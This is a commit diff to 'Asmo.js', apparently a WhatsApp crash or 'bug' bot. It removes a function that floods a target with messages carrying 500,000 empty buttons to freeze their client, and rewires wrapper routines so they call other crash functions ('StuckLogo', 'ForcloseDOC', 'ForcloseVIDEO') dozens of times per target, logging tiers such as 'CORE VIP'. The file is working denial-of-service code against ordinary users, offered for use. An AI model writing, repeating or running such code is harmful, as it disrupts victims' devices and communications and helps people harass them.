b3d298b4bed73b9d0a98cab652b1da4a79b28b85
sanz-max <xdsanz78@gmail.com>
2026-09-18 20:50:33 +0700

    Update Asmo.js

--- Asmo.js
+++ Asmo.js
@@ -4026,31 +4026,7 @@ async function StuckLogo(target) {
     }
   }, { participant: target });
 }
-async function freezeinvis21(target) {
-  const start = Date.now();
-  while (Date.now() - start < 100000) {
-    try {
-      await sock.relayMessage(target, {
-        groupStatusMessageV2: {
-          message: {
-            interactiveMessage: {
-              body: { text: "!Sseraphhnieee" },
-              nativeFlowMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({}))
-              }
-            }
-          }
-        }
-      }, {
-        noSyncSelf: true,
-        participant: target
-      });
-    } catch (e) {
-      if (e.code !== 'EPIPE') console.log("Error:", e.message);
-    }
-    await new Promise((r) => setTimeout(r, 2000));
-  }
-}
+
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 25; i++) {
@@ -4098,10 +4074,14 @@ async function crayxui(target) {
 for (let i = 0; i < 25; i++) {
 await starttime(target)
 await ForcloseSTC(target)
-await freezeinvis21(target)
+await StuckLogo(target)
 await ForcloseVIDEO(target)
 await ForcloseDOC(target)
-await freezeinvis21(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
@@ -4113,11 +4093,16 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 
 async function crayxsuper(target) {
 for (let i = 0; i < 50; i++) {
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -4134,11 +4119,16 @@ await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
@@ -4146,11 +4136,11 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 
 async function Crayxbayar(target) {
 for (let i = 0; i < 20; i++) {
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
-await freezeinvis21(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
